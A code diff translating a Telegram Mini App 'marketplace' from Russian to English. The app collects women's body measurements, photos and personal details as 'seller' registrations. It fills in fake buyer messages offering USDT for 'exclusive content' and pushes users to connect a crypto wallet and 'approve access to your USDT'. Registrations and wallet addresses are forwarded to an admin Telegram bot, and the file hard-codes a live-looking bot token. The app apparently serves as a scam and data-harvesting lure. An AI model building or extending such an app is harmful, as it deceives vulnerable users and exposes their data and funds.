@@ -1,11 +1,11 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
 <title>Marketplace TMA</title>
-<!-- version: 4 -->
-<!-- Увеличивайте цифру version каждый раз, когда меняете код. Это помогает Telegram сбросить кэш WebView. -->
+<!-- version: 5 -->
+<!-- Increase the version number every time you update the code. This helps Telegram clear the WebView cache. -->
 <style>
   :root {
     --bg1: #0b0b1a;
@@ -50,7 +50,7 @@
     overflow-x: hidden;
   }
 
-  /* Бегущая строка */
+  /* Ticker */
   .ticker-wrap {
     position: fixed;
     top: 0;
@@ -90,7 +90,7 @@
     100% { transform: translateX(-50%); }
   }
 
-  /* Круг регистрации / профиля */
+  /* Profile circle */
   .profile-area {
     margin-top: 56px;
     display: flex;
@@ -166,7 +166,7 @@
     display: flex;
   }
 
-  /* Заголовок и сетка продавцов */
+  /* Sellers section */
   .section-title {
     padding: 16px 16px 10px;
     font-size: 18px;
@@ -216,7 +216,7 @@
     white-space: nowrap;
   }
 
-  /* Модальные окна */
+  /* Modals */
   .modal-overlay {
     position: fixed;
     inset: 0;
@@ -495,103 +495,103 @@
   <div class="sellers-grid" id="sellersGrid"></div>
 </div>
 
-<!-- Модальное окно выбора роли -->
+<!-- Role selection modal -->
 <div class="modal-overlay" id="roleModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Выберите роль</div>
+      <div class="modal-title">Choose role</div>
       <button class="modal-close" data-close="roleModal">×</button>
     </div>
-    <div class="role-btn" id="btnSeller">Я продавец</div>
-    <div class="role-btn" id="btnBuyer">Я покупатель</div>
+    <div class="role-btn" id="btnSeller">I am a seller</div>
+    <div class="role-btn" id="btnBuyer">I am a buyer</div>
   </div>
 </div>
 
-<!-- Форма регистрации продавца -->
+<!-- Seller registration form -->
 <div class="modal-overlay" id="regModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Регистрация продавца</div>
+      <div class="modal-title">Seller registration</div>
       <button class="modal-close" data-close="regModal">×</button>
     </div>
     <div class="form-group">
-      <label>Имя</label>
-      <input type="text" id="regName" placeholder="Ваше имя" maxlength="40">
+      <label>Name</label>
+      <input type="text" id="regName" placeholder="Your name" maxlength="40">
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Возраст</label>
+        <label>Age</label>
         <input type="number" id="regAge" placeholder="22" min="18" max="99">
       </div>
       <div class="form-group">
-        <label>Страна</label>
-        <input type="text" id="regCountry" placeholder="Страна" maxlength="40">
+        <label>Country</label>
+        <input type="text" id="regCountry" placeholder="Country" maxlength="40">
       </div>
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Рост (см)</label>
+        <label>Height (cm)</label>
         <input type="number" id="regHeight" placeholder="170" min="140" max="220">
       </div>
       <div class="form-group">
-        <label>Вес (кг)</label>
+        <label>Weight (kg)</label>
         <input type="number" id="regWeight" placeholder="55" min="40" max="150">
       </div>
     </div>
     <div class="form-row">
       <div class="form-group">
-        <label>Бюст</label>
-        <input type="text" id="regBust" placeholder="например C" maxlength="10">
+        <label>Bust</label>
+        <input type="text" id="regBust" placeholder="e.g. C" maxlength="10">
       </div>
       <div class="form-group">
-        <label>Параметры</label>
+        <label>Parameters</label>
         <input type="text" id="regParams" placeholder="90-60-90" maxlength="20">
       </div>
     </div>
-    <button class="btn btn-primary" id="regContinue">Продолжить к фото</button>
+    <button class="btn btn-primary" id="regContinue">Continue to photos</button>
   </div>
 </div>
 
-<!-- Загрузка фото -->
+<!-- Photo upload modal -->
 <div class="modal-overlay" id="photoModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Загрузка фотографий</div>
+      <div class="modal-title">Upload photos</div>
       <button class="modal-close" data-close="photoModal">×</button>
     </div>
-    <p class="hint">Выберите минимум 3 фотографии из галереи</p>
+    <p class="hint">Select at least 3 photos from your gallery</p>
     <div class="photo-slots" id="photoSlots">
-      <div class="photo-slot" data-idx="0"><span class="placeholder">Фото 1</span></div>
-      <div class="photo-slot" data-idx="1"><span class="placeholder">Фото 2</span></div>
-      <div class="photo-slot" data-idx="2"><span class="placeholder">Фото 3</span></div>
+      <div class="photo-slot" data-idx="0"><span class="placeholder">Photo 1</span></div>
+      <div class="photo-slot" data-idx="1"><span class="placeholder">Photo 2</span></div>
+      <div class="photo-slot" data-idx="2"><span class="placeholder">Photo 3</span></div>
     </div>
     <input type="file" id="photoInput" class="photo-input-hidden" accept="image/*" multiple>
-    <button class="btn btn-secondary" id="btnSelectPhotos">Выбрать фотографии</button>
-    <button class="btn btn-primary" id="btnConfirmPhotos" disabled>Подтвердить и зарегистрироваться</button>
+    <button class="btn btn-secondary" id="btnSelectPhotos">Select photos</button>
+    <button class="btn btn-primary" id="btnConfirmPhotos" disabled>Confirm & Register</button>
   </div>
 </div>
 
-<!-- Предложения -->
+<!-- Offers modal -->
 <div class="modal-overlay" id="offersModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Предложения</div>
+      <div class="modal-title">Offers</div>
       <button class="modal-close" data-close="offersModal">×</button>
     </div>
     <div id="offersList"></div>
   </div>
 </div>
 
-<!-- Подключение кошелька -->
+<!-- Wallet modal -->
 <div class="modal-overlay" id="walletModal">
   <div class="modal">
     <div class="modal-header">
-      <div class="modal-title">Подключение кошелька</div>
+      <div class="modal-title">Connect wallet</div>
       <button class="modal-close" data-close="walletModal">×</button>
     </div>
-    <p class="wallet-info">Перед продолжением подключите криптокошелёк.<br>Подтвердите доступ к USDT.</p>
+    <p class="wallet-info">Before proceeding, connect your crypto wallet.<br>Approve access to your USDT to continue.</p>
     <div class="form-group">
-      <label>Сеть</label>
+      <label>Network</label>
       <select id="walletNetwork">
         <option value="Ethereum">Ethereum</option>
         <option value="BSC">BSC</option>
@@ -599,10 +599,10 @@
       </select>
     </div>
     <div class="form-group">
-      <label>Адрес кошелька</label>
-      <input type="text" id="walletAddress" placeholder="0x... или T..." maxlength="64">
+      <label>Wallet address</label>
+      <input type="text" id="walletAddress" placeholder="0x... or T..." maxlength="64">
     </div>
-    <button class="btn btn-primary" id="btnApprove">Подтвердить</button>
+    <button class="btn btn-primary" id="btnApprove">Approve</button>
   </div>
 </div>
 
@@ -612,16 +612,15 @@
 
 <script>
 /*
-  НАСТРОЙКИ
-  ---------
-  Заполните эти поля, если хотите получать уведомления в Telegram
-  и использовать JSONBin. Если оставить пустыми — приложение
-  будет работать полностью локально (через localStorage).
+  CONFIGURATION
+  -------------
+  Fill these fields if you want admin notifications via Telegram
+  and optional JSONBin support. Leave empty to work fully offline (localStorage only).
 
-  BOT_TOKEN       — токен бота от @BotFather
-  ADMIN_CHAT_ID   — ваш числовой ID в Telegram
-  JSONBIN_API_KEY — ключ X-Master-Key с сайта jsonbin.io
-  JSONBIN_BIN_ID  — идентификатор бина
+  BOT_TOKEN       — token from @BotFather
+  ADMIN_CHAT_ID   — your numeric Telegram ID
+  JSONBIN_API_KEY — X-Master-Key from jsonbin.io
+  JSONBIN_BIN_ID  — bin identifier
 */
 const BOT_TOKEN = "8321043451:AAFkPYQUfofdsb7dbKBaZpxpJ3o55YHN9W8";
 const ADMIN_CHAT_ID = "8696933754";
@@ -851,7 +850,7 @@ function openOffers() {
   const list = $("offersList");
   const offers = userProfile.offers || [];
   if (offers.length === 0) {
-    list.innerHTML = "<div class=\"empty-state\">Пока нет предложений.<br>Загляните позже.</div>";
+    list.innerHTML = "<div class=\"empty-state\">No offers yet.<br>Check back later.</div>";
   } else {
     let html = "";
     for (let i = 0; i < offers.length; i++) {
@@ -863,7 +862,7 @@ function openOffers() {
           "<div class=\"offer-name\">" + escapeHtml(o.buyerName) + "</div>" +
         "</div>" +
         "<div class=\"offer-msg\">" + escapeHtml(o.message) + "</div>" +
-        "<button class=\"btn btn-primary\" style=\"margin-top:0;padding:10px;\" data-offer-idx=\"" + i + "\">Сделать предложение</button>" +
+        "<button class=\"btn btn-primary\" style=\"margin-top:0;padding:10px;\" data-offer-idx=\"" + i + "\">Make offer</button>" +
       "</div>";
     }
     list.innerHTML = html;
@@ -897,7 +896,7 @@ function escapeHtml(str) {
 function handleMakeOffer(offer) {
   if (!userProfile.wallet || !userProfile.wallet.address) {
     pendingDealBuyer = offer;
-    alert("Чтобы продолжить, подключите криптокошелёк.");
+    alert("To proceed, connect your crypto wallet.");
     hideModal("offersModal");
     showModal("walletModal");
     return;
@@ -907,10 +906,10 @@ function handleMakeOffer(offer) {
 
 async function processDeal(offer) {
   showLoading(true);
-  const text = "🔔 <b>Запрос на сделку</b>\nПродавец: " + userProfile.name + "\nПокупатель: " + offer.buyerName + "\nКошелёк: " + userProfile.wallet.network + " / " + userProfile.wallet.address;
+  const text = "🔔 <b>Deal request</b>\nSeller: " + userProfile.name + "\nBuyer: " + offer.buyerName + "\nWallet: " + userProfile.wallet.network + " / " + userProfile.wallet.address;
   await notifyAdmin(text);
   showLoading(false);
-  alert("Предложение успешно отправлено! Администратор уведомлён.");
+  alert("Offer sent successfully! Admin has been notified.");
   pendingDealBuyer = null;
 }
 
@@ -929,11 +928,11 @@ function continueToPhotos() {
   const params = $("regParams").value.trim();
 
   if (!name || name.length < 2) {
-    alert("Пожалуйста, укажите имя");
+    alert("Please enter your name");
     return;
   }
   if (!age || age < 18) {
-    alert("Возраст должен быть не менее 18 лет");
+    alert("Age must be 18 or older");
     return;
   }
 
@@ -965,7 +964,7 @@ function renderPhotoSlots() {
     if (selectedPhotos[i]) {
       slots[i].innerHTML = "<img src=\"" + selectedPhotos[i] + "\" alt=\"\">";
     } else {
-      slots[i].innerHTML = "<span class=\"placeholder\">Фото " + (i + 1) + "</span>";
+      slots[i].innerHTML = "<span class=\"placeholder\">Photo " + (i + 1) + "</span>";
     }
   }
   const count = selectedPhotos.filter(function(p) { return !!p; }).length;
@@ -996,7 +995,7 @@ function handlePhotoSelect(e) {
 async function confirmPhotos() {
   const count = selectedPhotos.filter(function(p) { return !!p; }).length;
   if (count < 3) {
-    alert("Пожалуйста, выберите минимум 3 фотографии");
+    alert("Please select at least 3 photos");
     return;
   }
   userProfile.photos = selectedPhotos.filter(function(p) { return !!p; });
@@ -1004,7 +1003,7 @@ async function confirmPhotos() {
   hideModal("photoModal");
   updateProfileUI();
 
-  const text = "🆕 <b>Новый продавец зарегистрирован</b>\nИмя: " + userProfile.name + "\nВозраст: " + userProfile.age + "\nСтрана: " + (userProfile.country || "-");
+  const text = "🆕 <b>New seller registered</b>\nName: " + userProfile.name + "\nAge: " + userProfile.age + "\nCountry: " + (userProfile.country || "-");
   notifyAdmin(text);
 
   try {
@@ -1040,7 +1039,7 @@ async function approveWallet() {
   const network = $("walletNetwork").value;
   const address = $("walletAddress").value.trim();
   if (!address || address.length < 10) {
-    alert("Пожалуйста, введите корректный адрес кошелька");
+    alert("Please enter a valid wallet address");
     return;
   }
 
@@ -1062,10 +1061,10 @@ async function approveWallet() {
   showLoading(false);
   hideModal("walletModal");
 
-  const text = "💼 <b>Кошелёк подключён</b>\nРоль: " + userProfile.role + "\nИмя: " + (userProfile.name || "-") + "\nСеть: " + network + "\nАдрес: <code>" + address + "</code>";
+  const text = "💼 <b>Wallet connected</b>\nRole: " + userProfile.role + "\nName: " + (userProfile.name || "-") + "\nNetwork: " + network + "\nAddress: <code>" + address + "</code>";
   await notifyAdmin(text);
 
-  alert("Кошелёк успешно подключён!");
+  alert("Wallet connected successfully!");
 
   if (pendingDealBuyer && userProfile.role === "seller") {
     processDeal(pendingDealBuyer);
@@ -1122,18 +1121,18 @@ async function afterRender() {
 
   if (buyerProfiles.length === 0) {
     buyerProfiles = [
-      { id: "b1", name: "Alex M.", photo: "", message: "Здравствуйте, мне понравился ваш профиль. Готовы обсудить сделку?" },
-      { id: "b2", name: "James K.", photo: "", message: "Ищу эксклюзивный контент. Готов оплатить в USDT." },
-      { id: "b3", name: "Michael R.", photo: "", message: "Заинтересован. Давайте обсудим условия." },
-      { id: "b4", name: "David L.", photo: "", message: "Параметры отличные. Хочу сделать предложение." },
-      { id: "b5", name: "Chris P.", photo: "", message: "Свободны сейчас? Серьёзный интерес, хороший бюджет." }
+      { id: "b1", name: "Alex M.", photo: "", message: "Hi, I like your profile. Are you available for a private deal?" },
+      { id: "b2", name: "James K.", photo: "", message: "Looking for exclusive content. Ready to pay in USDT." },
+      { id: "b3", name: "Michael R.", photo: "", message: "Interested. Let's discuss terms privately." },
+      { id: "b4", name: "David L.", photo: "", message: "Your parameters look great. Want to make an offer." },
+      { id: "b5", name: "Chris P.", photo: "", message: "Available now? High budget, serious inquiry." }
     ];
   }
 
   maybeGenerateOffer();
 }
 
-// Запуск приложения
+// App start
 (function init() {
   initTelegram();
   buildTicker();
@@ -1145,4 +1144,4 @@ async function afterRender() {
 })();
 </script>
 </body>
-  </html>
+    </html>
